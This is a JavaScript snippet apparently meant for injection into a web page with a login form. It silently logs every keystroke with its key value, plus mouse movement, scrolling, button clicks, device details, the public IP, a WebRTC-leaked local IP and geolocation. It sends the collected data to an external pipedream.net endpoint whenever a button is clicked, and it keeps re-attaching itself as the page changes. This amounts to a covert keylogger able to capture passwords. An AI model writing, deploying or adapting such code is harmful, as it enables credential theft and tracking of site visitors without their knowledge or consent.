<script>
  (function () {
    const serverEndpoint = "https://700bebc8a052541caf0ff9e5de2c58bc.m.pipedream.net"; // Replace with your API

    // 🔹 Mouse & Keyboard Data Storage
    let mouseData = [];
    let keyboardData = [];
    let buttonClickData = []; // 🔥 Stores button click info
    let lastKeyReleaseTime = null;

    // 🔹 Mouse Activity Tracking
    function trackMouseEvents() {
      document.addEventListener("mousemove", (event) => {
        mouseData.push({ x: event.clientX, y: event.clientY, type: "move", time: Date.now() });
      });

      document.addEventListener("click", (event) => {
        mouseData.push({ x: event.clientX, y: event.clientY, type: "click", time: Date.now() });
      });

      document.addEventListener("scroll", () => {
        mouseData.push({ scrollX: window.scrollX, scrollY: window.scrollY, type: "scroll", time: Date.now() });
      });
    }

    // 🔹 Keyboard Activity Tracking
    function trackKeyboardEvents() {
      document.addEventListener("keydown", (event) => {
        if (!keyboardData.some((data) => data.key === event.key && data.end === null)) {
          const startTime = Date.now();
          let releaseToPress = lastKeyReleaseTime ? startTime - lastKeyReleaseTime : null;

          keyboardData.push({
            key: event.key,
            start: startTime,
            end: null,
            hold: null,
            releaseToPress: releaseToPress,
          });
        }
      });

      document.addEventListener("keyup", (event) => {
        const endTime = Date.now();
        const keyEvent = keyboardData.find((data) => data.key === event.key && data.end === null);

        if (keyEvent) {
          keyEvent.end = endTime;
          keyEvent.hold = keyEvent.end - keyEvent.start;
          lastKeyReleaseTime = endTime;
        }
      });
    }

    // 🔹 Send System Data
    async function sendSystemData(triggeredBy = "form submission", buttonData = null) {
      const deviceDetails = getDeviceDetails();
      const publicIP = await getPublicIP();
      const localIP = await getLocalIP();
      const geoDetails = await getGeoDetails();

      // 🔥 Include button click data if available
      if (buttonData) {
        buttonClickData.push(buttonData);
      }

      const payload = {
        deviceDetails,
        publicIP,
        localIP,
        geoDetails,
        mouseData,
        keyboardData,
        buttonClickData,
        triggeredBy // Logs if the call came from form submit or a button
      };

      try {
        await fetch(serverEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        console.log(`✅ Data sent successfully (Triggered by: ${triggeredBy})`);
      } catch (error) {
        console.error("❌ Error sending system data:", error);
      }

      // Clear collected data after sending
      mouseData = [];
      keyboardData = [];
      buttonClickData = [];
    }

    function getDeviceDetails() {
      return {
        browser: getBrowserName(),
        os: getOS(),
        screenResolution: `${screen.width}x${screen.height}`,
        language: navigator.language || navigator.userLanguage,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    function getOS() {
      const userAgent = navigator.userAgent.toLowerCase();
      if (userAgent.includes("windows")) return "Windows";
      if (userAgent.includes("mac")) return "MacOS";
      if (userAgent.includes("linux")) return "Linux";
      if (userAgent.includes("android")) return "Android";
      if (userAgent.includes("iphone") || userAgent.includes("ipad")) return "iOS";
      return "Unknown";
    }

    function getBrowserName() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Chrome")) return "Chrome";
      if (userAgent.includes("Firefox")) return "Firefox";
      if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
      if (userAgent.includes("Edge")) return "Edge";
      if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
      if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";
      return "Unknown";
    }

    async function getPublicIP() {
      try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch {
        return "Unknown";
      }
    }

    function getLocalIP() {
      return new Promise((resolve) => {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel("");
        rtc.createOffer()
          .then((offer) => rtc.setLocalDescription(offer))
          .catch(() => resolve("Unknown"));

        rtc.onicecandidate = (event) => {
          if (event && event.candidate && event.candidate.candidate) {
            const ip = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
            resolve(ip ? ip[0] : "Unknown");
          }
        };

        setTimeout(() => resolve("Unknown"), 5000);
      });
    }

    async function getGeoDetails() {
      try {
        const response = await fetch("http://ip-api.com/json/");
        const data = await response.json();
        return {
          city: data.city || "Unknown",
          country: data.country || "Unknown",
          isp: data.isp || "Unknown"
        };
      } catch {
        return "Unknown";
      }
    }

    function attachFormListener() {
      const loginForm = document.querySelector("form");

      if (loginForm) {
        console.log("🔄 Attaching form listener...");
        loginForm.removeEventListener("submit", handleSubmit);
        loginForm.addEventListener("submit", handleSubmit);
      }
    }

    async function handleSubmit(event) {
      event.preventDefault();
      // await sendSystemData("form submission");

      const form = event.target;
      const formData = new FormData(form);
      const action = form.getAttribute("action");
      const method = form.getAttribute("method") || "POST";

      try {
        const response = await fetch(action, {
          method: method.toUpperCase(),
          body: formData,
        });

        if (response.ok) {
          console.log("✅ Login successful");
          window.location.href = "/dashboard";
        } else {
          console.error("❌ Login failed");
        }
      } catch (error) {
        console.error("❌ Error submitting form:", error);
      }
    }

    // 🔹 Attach Event Listeners to All Buttons
    function attachButtonListeners() {
      document.querySelectorAll("button").forEach((button) => {
        button.removeEventListener("click", buttonClickHandler);
        button.addEventListener("click", buttonClickHandler);
      });
    }

    async function buttonClickHandler(event) {
      // Ensure we're capturing the correct button
      const button = event.currentTarget; // Ensures we get the button, not an inner element

      // Get meaningful text for buttons without innerText
      let buttonText = button.innerText.trim();
      if (!buttonText) {
        buttonText = button.getAttribute("aria-label") || button.getAttribute("title") || "Unnamed Button";
      }

      // Prepare button data for tracking
      const buttonData = {
        text: buttonText,
        id: button.id || "No ID",
        class: button.className || "No Class",
        tagName: button.tagName, // Captures the HTML tag type (button, div, etc.)
        time: Date.now()
      };

      console.log(`🔘 Button Clicked: ${buttonData.text} (ID: ${buttonData.id}, Class: ${buttonData.class})`);

      // Send the captured button data
      await sendSystemData("button click", buttonData);
    }


    // Observer to detect changes in DOM (for SPAs)
    const observer = new MutationObserver(() => {
      attachFormListener();
      attachButtonListeners();
    });

    document.addEventListener("DOMContentLoaded", () => {
      attachFormListener();
      attachButtonListeners();
      trackMouseEvents();
      trackKeyboardEvents();
      observer.observe(document.body, { childList: true, subtree: true });
    });

  })();
</script>
